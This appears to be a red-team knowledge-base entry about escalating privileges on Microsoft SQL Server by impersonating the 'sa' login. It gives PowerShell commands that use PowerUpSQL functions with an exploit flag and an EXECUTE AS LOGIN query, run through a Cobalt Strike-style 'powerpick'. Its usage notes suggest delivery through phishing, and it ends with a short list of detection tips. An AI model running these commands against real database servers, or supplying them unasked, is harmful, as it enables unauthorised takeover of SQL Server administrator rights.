---
id: 55be64cb-9d0f-4aaf-b210-2300a26a2bd1
name: PowerShell-MSSQL-SA-Impersonation
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:20.650023+00:00'
updated_at: '2023-04-10T20:36:41.382795+00:00'
platforms:
  - Windows
tags:
  - mssql
  - impersonation
  - powershell
validated: true
---

# PowerShell-MSSQL-SA-Impersonation

## Code

```ps1
Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose

# impersonate sa account
powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin')" -Verbose -Debug
```

## Description

This PowerShell script uses custom functions (likely from PowerUpSQL or similar modules) to impersonate the sa (system administrator) login in MSSQL, exploiting audit privileges if available, and then queries for sysadmin role membership under the impersonated context. It enables server-level privilege escalation for auditing or exploitation purposes.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| sa | Username for impersonation (fixed as sa) | sa |
| Password1234 | Password for the sa account | ActualPassword |
| <DBSERVERNAME\DBInstance> | SQL Server instance name (server\instance) | sqlserver01\MSSQL2019 |

## Usage

Load required modules (e.g., Import-Module PowerUpSQL) on a Windows machine with SQL access. Execute the script to attempt sa impersonation and verify sysadmin access. Use in red team scenarios for testing weak sa credentials or misconfigurations; deliver via initial access vectors like phishing.

## Detection

- Monitor PowerShell execution logs for Invoke-SQLAuditPrivImpersonateLogin or Get-SQLQuery invocations.
- Audit SQL Server logs for EXECUTE AS LOGIN attempts targeting 'sa'.
- Network traffic to port 1433 from unusual sources or with credential patterns.
- Sysadmin role queries from non-admin sessions.

## Related

- [[procedures/Exploit-MSSQL-Impersonation-for-Privilege-Escalation]]
